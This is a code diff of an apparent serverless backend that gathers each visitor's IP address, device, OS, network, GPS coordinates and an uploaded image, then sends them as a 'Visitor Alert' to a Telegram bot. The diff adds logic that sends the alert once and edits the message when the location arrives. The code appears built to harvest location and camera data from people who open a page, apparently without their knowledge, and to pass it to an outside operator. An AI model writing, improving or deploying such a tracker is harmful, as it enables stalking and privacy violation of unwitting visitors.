@@ -17,14 +17,33 @@ export async function onRequestPost({ request, env }) {
 
     await env.VISITOR_KV.put(id, JSON.stringify(session));
 
-    // ✅ PREVENT DUPLICATE TELEGRAM
+    // =========================
+    // ✅ FINAL EVENT (SEND ONCE)
+    // =========================
     if (body.event === "final") {
-      const key = `sent_${id}`;
-      const already = await env.VISITOR_KV.get(key);
 
-      if (!already) {
-        await safeTelegram(env, session);
-        await env.VISITOR_KV.put(key, "1", { expirationTtl: 300 }); // 5 min lock
+      const key = `msg_${id}`;
+      const exists = await env.VISITOR_KV.get(key);
+
+      if (!exists) {
+        const messageId = await sendTelegram(env, session);
+
+        await env.VISITOR_KV.put(key, messageId, {
+          expirationTtl: 3600
+        });
+      }
+    }
+
+    // =========================
+    // ✅ GPS EVENT (EDIT MESSAGE)
+    // =========================
+    if (body.event === "gps" && session.lat && session.lng) {
+
+      const key = `msg_${id}`;
+      const messageId = await env.VISITOR_KV.get(key);
+
+      if (messageId) {
+        await editTelegram(env, messageId, session);
       }
     }
 
@@ -33,12 +52,15 @@ export async function onRequestPost({ request, env }) {
     });
 
   } catch (err) {
+
     await safeTelegram(env, {
       error: err.message,
       raw: JSON.stringify(body)
     });
 
-    return new Response(JSON.stringify({ error: err.message }), {
+    return new Response(JSON.stringify({
+      error: err.message
+    }), {
       status: 500,
       headers: { "Content-Type": "application/json" }
     });
@@ -73,45 +95,20 @@ async function safeTelegram(env, s) {
 
 
 // =======================
-// TELEGRAM MAIN
+// TELEGRAM MAIN (SEND)
 // =======================
 async function sendTelegram(env, s) {
 
   const map = s.lat && s.lng
     ? `https://maps.google.com/?q=${s.lat},${s.lng}`
-    : "N/A";
+    : "Waiting for location...";
 
-  const text = `
-🚨 <b>Visitor Alert</b>
+  const text = buildText(s, map);
 
-🕒 <b>Time:</b> ${formatTime(s.updated)}
-🌐 <b>IP:</b> ${s.ip || "-"}
+  let result;
 
-📱 <b>Device:</b> ${shortDevice(s.device)}
-💻 <b>OS:</b> ${s.os || "-"}
-🌍 <b>Browser:</b> ${getBrowser(s.device)}
-
-📡 <b>Network:</b> ${s.network || "-"}
-
-📍 <b>Location:</b>
-Lat: ${s.lat || "-"}
-Lng: ${s.lng || "-"}
-
-🔗 <a href="${map}">Open Map</a>
-
-${s.error ? `\n❌ <b>Error:</b> ${s.error}` : ""}
-`;
-
-  // ===================
-  // IMAGE HANDLING
-  // ===================
-  if (s.image && s.image.startsWith("data:image")) {
-
-    // ✅ size protection (single rule)
-    if (s.image.length > 700000) {
-      console.log("Image too large → sending text only");
-      return await sendText(env, text);
-    }
+  // 📸 IMAGE PATH
+  if (s.image && s.image.startsWith("data:image") && s.image.length < 700000) {
 
     const res = await fetch(s.image);
     const blob = await res.blob();
@@ -127,45 +124,102 @@ ${s.error ? `\n❌ <b>Error:</b> ${s.error}` : ""}
       body: form
     });
 
-    const result = await tg.json();
-
-    if (!result.ok) {
-      throw new Error("Telegram photo error: " + JSON.stringify(result));
-    }
-
-    return result;
+    result = await tg.json();
 
   } else {
-    return await sendText(env, text);
+
+    // 📝 TEXT PATH
+    const tg = await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      body: new URLSearchParams({
+        chat_id: env.CHAT_ID,
+        text,
+        parse_mode: "HTML"
+      })
+    });
+
+    result = await tg.json();
   }
+
+  if (!result.ok) {
+    throw new Error(JSON.stringify(result));
+  }
+
+  return result.result.message_id;
 }
 
 
 // =======================
-// TEXT FALLBACK
+// TELEGRAM EDIT (UPDATE)
 // =======================
-async function sendText(env, text) {
-  const tg = await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
+async function editTelegram(env, messageId, s) {
+
+  const map = `https://maps.google.com/?q=${s.lat},${s.lng}`;
+  const text = buildText(s, map);
+
+  // try caption edit (for photo)
+  let tg = await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/editMessageCaption`, {
     method: "POST",
     body: new URLSearchParams({
       chat_id: env.CHAT_ID,
-      text: text,
+      message_id: messageId,
+      caption: text,
       parse_mode: "HTML"
     })
   });
 
-  const result = await tg.json();
+  let result = await tg.json();
 
+  // fallback → text edit
   if (!result.ok) {
-    throw new Error("Telegram text error: " + JSON.stringify(result));
-  }
+    tg = await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/editMessageText`, {
+      method: "POST",
+      body: new URLSearchParams({
+        chat_id: env.CHAT_ID,
+        message_id: messageId,
+        text,
+        parse_mode: "HTML"
+      })
+    });
 
-  return result;
+    result = await tg.json();
+
+    if (!result.ok) {
+      throw new Error("Edit failed: " + JSON.stringify(result));
+    }
+  }
 }
 
 
 // =======================
-// HELPERS (OUTSIDE)
+// TEXT BUILDER
+// =======================
+function buildText(s, map) {
+  return `
+🚨 <b>Visitor Alert</b>
+
+🕒 <b>Time:</b> ${formatTime(s.updated)}
+🌐 <b>IP:</b> ${s.ip || "-"}
+
+📱 <b>Device:</b> ${shortDevice(s.device)}
+💻 <b>OS:</b> ${s.os || "-"}
+🌍 <b>Browser:</b> ${getBrowser(s.device)}
+
+📡 <b>Network:</b> ${s.network || "-"}
+
+📍 <b>Location:</b>
+Lat: ${s.lat || "Fetching..."}
+Lng: ${s.lng || "Fetching..."}
+
+🔗 <a href="${map}">Open Map</a>
+
+${s.error ? `\n❌ <b>Error:</b> ${s.error}` : ""}
+`;
+}
+
+
+// =======================
+// HELPERS
 // =======================
 function formatTime(t) {
   return new Date(t).toLocaleString("en-IN", {
